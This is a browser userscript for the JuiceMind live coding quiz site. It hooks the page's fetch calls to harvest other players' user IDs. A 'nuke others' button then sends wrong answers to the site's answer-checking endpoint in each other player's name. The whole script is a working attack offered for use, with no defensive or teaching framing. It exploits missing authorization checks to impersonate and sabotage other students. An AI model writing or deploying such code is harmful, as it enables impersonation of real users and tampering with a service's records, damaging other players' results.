// ==UserScript==
// @name           juicemind make others answer wrong (live quiz)
// @description    thanks juicemind! more @ https://github.com/VillainsRule/Juicemind
// @icon           https://i.imgur.com/ORAaPzD.png
// @version        1.0

// @author         VillainsRule
// @namespace      https://github.com/VillainsRule/Juicemind

// @match          *://play.juicemind.com/*
// @run-at         document-start
// @grant          none
// ==/UserScript==

let extractedIds = [];

let _fetch = fetch;

fetch = window.fetch = async (...args) => {
    const response = await _fetch(...args);
    const clonedResponse = response.clone();

    clonedResponse.text().then(text => {
        text = text.replaceAll('\n', '');
        text = text.replaceAll(' ', '');

        let matches = [...text.matchAll(/"userId":\{"stringValue":"(.*?)"\}/g)];
        let userIds = matches.map(match => match[1]);

        extractedIds = [...extractedIds, ...userIds];
    });

    return response;
};

const getLatestState = () => {
    function findByKey(object, key, seen = new Set()) {
        if (seen.has(object)) return undefined;
        seen.add(object);
        for (let k of Object.keys(object)) {
            if (k === key && object[k]?.['questionType']) {
                return object[k];
            }
            if (object[k] && typeof object[k] === 'object') {
                let result = findByKey(object[k], key, seen);
                if (result !== undefined) return result;
            }
        }
        return undefined;
    }

    return findByKey(document.querySelector('#root'), 'question');
}

function findByKey(object, key, seen = new Set(), path = '') {
    if (seen.has(object)) return undefined;
    seen.add(object);

    for (let k of Object.keys(object)) {
        let newPath = path ? `${path}.${k}` : k;

        if (k === key) {
            return object[k];
        }

        if (object[k] && typeof object[k] === 'object') {
            let result = findByKey(object[k], key, seen, newPath);
            if (result !== undefined) return result;
        }
    }

    return undefined;
}

window.nuke = () => {
    let userId = findByKey(document.querySelector('#root'), 'userId');
    let gameId = findByKey(document.querySelector('#root'), 'gameRoomId');
    let state = getLatestState();

    const submitAnswer = (uid, args) => fetch('https://us-central1-juicemind-a9d9e.cloudfunctions.net/checkAnswer', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            data: {
                userId: uid,
                gameRoomId: gameId,
                ...args
            }
        }),
    });

    let schema;

    if (state.questionType == 'find-the-error') schema = { errorLine: Number.MAX_SAFE_INTEGER }
    else if (state.questionType == 'fill-in-the-code') schema = { code: 'haha get rekt' }
    else if (state.questionType == 'multiple-choice') schema = { multipleChoiceAnswerLetter: 'z', tipUsed: false }

    let targets = extractedIds.filter(p => p !== userId);
    targets.forEach((target) => submitAnswer(target, schema));
}

setTimeout(() => {
    document.body.insertAdjacentHTML('beforeend', `
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200..1000;1,200..1000&display=swap');

            .nuker {
                position: fixed;
                bottom: 10px;
                right: 10px;
                width: 300px;
                height: 70px;
                background-color: #155dfc;
                color: white;
                font-family: 'Nunito', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                flex-direction: column;
                z-index: 9999999999;
                font-weight: bold;
                border-radius: 5px;
                cursor: pointer;
            }
        </style>
    `);

    document.body.insertAdjacentHTML('beforeend', `
        <div class="nuker" onclick="nuke()">nuke others</div>
    `);
}, 1500);
